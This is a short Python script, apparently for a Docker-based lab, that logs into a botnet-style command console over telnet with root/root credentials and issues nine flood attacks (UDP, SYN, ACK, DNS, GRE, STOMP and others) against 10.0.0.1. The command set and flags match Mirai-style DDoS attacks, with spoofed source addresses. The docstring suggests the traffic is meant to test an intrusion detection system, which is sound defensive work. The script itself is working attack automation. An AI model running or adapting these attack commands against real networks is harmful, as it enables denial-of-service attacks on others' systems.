"""
To execute all the attacks run this script using below command, after running ids in emu3 docker container.
python3 ./attack_automation.py
"""
import pexpect
import time

CONTAINER = "emu2"
TELNET_HOST = "localhost"
TARGET = "10.0.0.1"
SOURCE = "255.255.255.255"
DURATION = 2
SLEEP_BETWEEN = 3

ATTACKS = {
    "udp":     f"tos=0 ident=random ttl=255 len=512 rand=1 df=0 sport=random dport=9 source={SOURCE}",
    "vse":     f"tos=0 ident=random ttl=255 df=0 sport=random dport=9",
    "dns":     f"tos=0 ident=random ttl=255 df=0 sport=random dport=53 domain=example.com dhid=random",
    "syn":     f"tos=0 ident=random ttl=255 df=0 sport=random dport=9 syn=1 ack=0 urg=0 psh=0 rst=0 fin=0 seqnum=random acknum=random source={SOURCE}",
    "ack":     f"len=512 rand=1 tos=0 ident=random ttl=255 df=0 sport=random dport=9 ack=1 urg=0 psh=0 rst=0 syn=0 fin=0 seqnum=random acknum=random source={SOURCE}",
    "stomp":   f"len=512 rand=1 tos=0 ident=random ttl=255 df=0 dport=9 urg=0 ack=0 psh=0 rst=0 syn=0 fin=0",
    "greip":   f"len=512 rand=1 tos=0 ident=random ttl=255 df=0 sport=random dport=9 gcip=0 source={SOURCE}",
    "greeth":  f"len=512 rand=1 tos=0 ident=random ttl=255 df=0 sport=random dport=9 gcip=0 source={SOURCE}",
    "udpplain":f"len=512 rand=1 dport=9"
}

child = pexpect.spawn(f"docker exec -i {CONTAINER} telnet {TELNET_HOST}", encoding='utf-8')


child.expect(r"Username.*:")
child.sendline("root")

child.expect(r"Password.*:")
child.sendline("root")

for name, flags in ATTACKS.items():
    print(f'Attack:{name} flags:{flags}')
    cmd = f"{name} {TARGET} {DURATION} {flags}"
    child.sendline(cmd)
    time.sleep(SLEEP_BETWEEN)

child.interact()
